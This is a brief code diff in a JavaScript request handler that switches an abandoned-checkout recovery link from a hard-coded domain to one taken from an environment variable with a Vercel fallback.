@@ -141,7 +141,7 @@ module.exports = async function handler(req, res) {
       recovery_email_sent: existing.recovery_email_sent || false,
       recovery_email_at: existing.recovery_email_at || null,
       recovery_msg_id: existing.recovery_msg_id || null,
-      recovery_url: `https://subwaypaysa.tech/takealot/checkout.html?recover=${encodeURIComponent(leadId)}${pSlug ? '&p=' + encodeURIComponent(pSlug) : ''}`
+      recovery_url: `${process.env.SITE_URL || 'https://ps5fim-s11m.vercel.app'}/order.html?recover=${encodeURIComponent(leadId)}${pSlug ? '&p=' + encodeURIComponent(pSlug) : ''}`
     });
 
     try {
